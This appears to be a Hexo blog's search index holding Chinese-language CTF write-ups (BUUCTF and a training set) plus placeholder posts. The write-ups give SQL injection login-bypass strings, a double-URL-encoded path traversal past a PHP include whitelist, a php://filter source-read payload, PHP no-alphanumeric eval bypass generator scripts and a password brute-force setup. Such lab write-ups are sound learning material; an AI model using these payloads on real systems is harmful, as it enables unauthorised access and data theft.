<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2023/01/17/buuqwq/"/>
    <url>/2023/01/17/buuqwq/</url>
    
    <content type="html"><![CDATA[<p>Do you want to ‘Brush’ the questions with me ???</p><span id="more"></span><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><h5 id="SQL？？？"><a href="#SQL？？？" class="headerlink" title="SQL？？？"></a>SQL？？？</h5><p>  首先，SQL注入是什么？？？<br>  我们都知道web分为前端和后端，前端负责进行展示，后端负责处理来自前端的请求并提供前端展示的资源，即然有资源，那么就需要有存储资源的地方——如mysql数据库。<br>那服务器如何对数据获取了？就需要使用SQL语句这一语法结构进行查询获取。SQL语句通过特有的语法对数据进行查询<br>不同的注入会有不同的结果（对数据的输入没有很好的过滤，输入1和输入1‘的结果不同）<br>  常见的参数类型：<br>  1.数字型  如:  <a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> 对应的sql语句为 select * from table where id=3<br>  2.字符型 如： select * from table where name=’admin’</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><img src="/2023/01/17/buuqwq/001.jpg" class title="ok"><p>先输入 “admin”和”123”, 返回用户名和密码错误<br>使用这个万能钥匙试一试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 万能公式</span><br><span class="hljs-attribute">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">1</span>&#x27; and &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br><span class="hljs-attribute">1</span> or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <br><span class="hljs-attribute">1</span>&#x27; or &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>前三个都正常报错，最后一个登录成功<br>为社么and不行呢？？？<br> <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros">网页URL: /?<span class="hljs-attribute">username</span>=1%27and%271%27%3D%271&amp;password=1%27and%271%27%3D%271<br>SELECT * <span class="hljs-keyword">FROM</span> tables WHERE <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span><br>优先级排序：<span class="hljs-keyword">and</span> 优先级高于 <span class="hljs-keyword">or</span>，所以要计算 <span class="hljs-keyword">and</span> 然后再计算 <span class="hljs-keyword">or</span><br><span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;1&#x27;</span>---&gt;false<br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>---&gt; <span class="hljs-literal">true</span><br><span class="hljs-attribute">passwrod</span>=<span class="hljs-string">&#x27;1&#x27;</span>---&gt;false<br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>---&gt;<span class="hljs-literal">true</span><br><span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> (<span class="hljs-literal">true</span> <span class="hljs-keyword">and</span> <span class="hljs-literal">false</span>) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span><br><span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span><br><span class="hljs-literal">false</span> <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span><br><span class="hljs-comment">#得出结果：true</span><br></code></pre></td></tr></table></figure><br>也就是利用了and和or优先级的特点，返回结果为true，即可</p><h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><img src="/2023/01/17/buuqwq/002.jpg" class title="ok"><p>开头招新题一样都是一张图片，直接查看源代码，发现有source.php打开，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <span class="hljs-comment">//突出文件</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> static function checkFile</span>(&amp;<span class="hljs-variable">$page</span>)  <span class="hljs-comment">//定义一个叫 checkFile 的函数</span><br>        &#123;<br>            <span class="hljs-variable">$whitelist </span>= [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];  <span class="hljs-comment">//定义白名单</span><br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;  <span class="hljs-comment">//isset判单是否存在、is_string（）判断是不是字符串</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;   <span class="hljs-comment">//判断参数与白名单是不是匹配</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>            &#125;<br><br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page </span>. <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)   //重点：<span class="hljs-title function_ invoke__">mb_substr</span>(str,start,<span class="hljs-title function_ invoke__">length</span>(可有可无),encode（可有可无）)是返回字符串str的一部分.  mb_strpos是查找字符串在另一个字符串首次出现的位置<br><br>            );<br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);  <span class="hljs-comment">//将参数进行url编码</span><br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page </span>. <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>所以先让参数file与白名单匹配，file=hint.php<br>接着它说flag在fffflllllaaaagggg文件中<br>file=hint.php?ffffllllaaaagggg<br>在这里就出现问题了，图片有显示出来。因为它只截取？前的内容，要绕过.   将?进行两次url编码(进行两次是因为浏览器会解码一次，代码又解码一次)<br>file=hint.php%253Fffffllllaaaagggg<br>但是没反应，可能是flag不在当前目录，我们查看上一个../<br>最后就出现flag</p><img src="/2023/01/17/buuqwq/0021.jpg" class title="ok"><h3 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h3><p>打开页面后，点击tips，</p><img src="/2023/01/17/buuqwq/005.jpg" class title="ok"><p>/?file=flag.php,有可能是文件漏洞，用php://查看文件源代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-number">1</span>.php（<span class="hljs-number">1</span>.php为文件名）<br></code></pre></td></tr></table></figure><img src="/2023/01/17/buuqwq/0051.jpg" class title="ok"><p>得到一串base64的密码，去解码就得到了flag</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>只有一个jpg格式的图片，属性里面什么都没有，用010打开，查看开头和结尾，发现flag</p><img src="/2023/01/17/buuqwq/003.jpg" class title="ok"><h3 id="HaveFun1"><a href="#HaveFun1" class="headerlink" title="HaveFun1"></a>HaveFun1</h3><p>打开网页</p><img src="/2023/01/17/buuqwq/004.jpg" class title="ok"><p>查看一下源代码，发现备注内容</p><img src="/2023/01/17/buuqwq/0041.jpg" class title="ok"><p>它让我们用GET传参，当变量cat等于dog时，会返回一个东西<br>输入后，得到flag</p><img src="/2023/01/17/buuqwq/0042.jpg" class title="ok"><h3 id="LSB隐码"><a href="#LSB隐码" class="headerlink" title="LSB隐码"></a>LSB隐码</h3><p>根据题目提示是LSB隐码，需要用到stegsolve<br>打开方式:</p><img src="/2023/01/17/buuqwq/006.jpg" class title="ok"><p>然后打开我们的图片，参考<a href="https://blog.csdn.net/weixin_52620919/article/details/119644862?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167404466716800182778223%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167404466716800182778223&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119644862-null-null.142%5Ev71%5Econtrol,201%5Ev4%5Eadd_ask&amp;utm_term=stegsolve&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_52620919/article/details/119644862?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167404466716800182778223%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167404466716800182778223&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-119644862-null-null.142^v71^control,201^v4^add_ask&amp;utm_term=stegsolve&amp;spm=1018.2226.3001.4187</a><br>接着打开Date Extract </p><img src="/2023/01/17/buuqwq/0061.jpg" class title="ok"><p>生成Text，没有找到flag。<br>然后试试生成Bin，扫描二维码，出现flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>Buu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一周web 无数字字母绕过</title>
    <link href="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/"/>
    <url>/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/</url>
    
    <content type="html"><![CDATA[<p>无数字字母绕过</p><span id="more"></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];         <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9]/is&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>        &#125;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>无数字字母绕过原理：通过利用除字母数字以外的字符进行运算从而凑出我们想要的字符<br>可以利用取反、异或等的方式构造指令<br>在网上找到了相应的脚本</p><p>0x01、取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN)); <br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure><p>0x02、异或(无引号；)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">例：_GET  =&gt;  %a0%b8%ba%ab</span><br><span class="hljs-comment">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="hljs-comment">*/</span><br><span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&#x27;&#x27;</span>;  <span class="hljs-comment">//payload</span><br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<span class="hljs-variable">$i</span>++)<br>&#123;   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$j</span>++)<br>    &#123;<br>        <span class="hljs-variable">$k</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)^<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">255</span>);   <span class="hljs-comment">//dechex(255) = ff</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span> == <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$i</span>])<br>            <span class="hljs-variable">$payload</span> .= <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;<br></code></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>先看一下网页的phpinfo能不能成功（注意：这道题好像还把;给ban掉了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br>即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo<br></code></pre></td></tr></table></figure><img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/002.jpg" class title="ok"><p>接着，查看一下网页的目录，执行system (ls)。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$&#123;_<span class="hljs-meta">GET</span>&#125;[变量<span class="hljs-number">1</span>]($&#123;_<span class="hljs-meta">GET</span>&#125;[变量<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/003.jpg" class title="ok"><p>没有找到对应的文件，继续查找上一级</p><img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/005.jpg" class title="ok"><p>最后cat fffllllaaaagggg，抓他</p><img src="/2023/01/15/%E7%AC%AC%E4%B8%80%E5%91%A8web2/004.jpg" class title="ok">]]></content>
    
    
    
    <tags>
      
      <tag>无数字字母绕过</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第一周web 爆破专家</title>
    <link href="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/"/>
    <url>/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/</url>
    
    <content type="html"><![CDATA[<p>##爆破专家</p><span id="more"></span><img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/101.jpg" class title="This is an test image"><p>输入账号:admin ，密码:000，返回“密码错误”</p><img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/102.jpg" class title="This is an test image"><p>可以通过抓包，对密码进行爆破<br>利用burpsuite对其抓包 （ಥ_ಥ 这个东西下载好了好长时间qwq） </p><img src="/2023/01/14/%E7%AC%AC%E4%B8%80%E5%91%A8web/103.jpg" class title="This is an test image"><p>账号是admin已经确定了，只需要对密码进行爆破</p><p>接下来就需要爆破字典了，题目中说“纯数字且不超过四位数”<br>可以简单写一个程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br>int <span class="hljs-function"><span class="hljs-title">main</span></span>()<br>&#123;<br>int a=0;<br><span class="hljs-keyword">for</span>(int i=1;i&lt;9999;i++)&#123;<br>a=i;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,a);<br>&#125;<br><span class="hljs-built_in">return</span> 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着在爆破的返回值中，找到返回长度不一样的就是密码了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第二次试验</title>
    <link href="/2023/01/14/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%95%E9%AA%8C/"/>
    <url>/2023/01/14/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%95%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<img src="/2023/01/14/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%AF%95%E9%AA%8C/001.jpg" class title="This is an test image"><p>查看图片</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>我的第一篇博客</title>
    <link href="/2023/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h3><p>这是我的第一篇’HEXO‘博客文章。</p><h3 id="okk"><a href="#okk" class="headerlink" title="okk"></a>okk</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/01/08/hello-world/"/>
    <url>/2023/01/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Hello</p><span id="more"></span><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
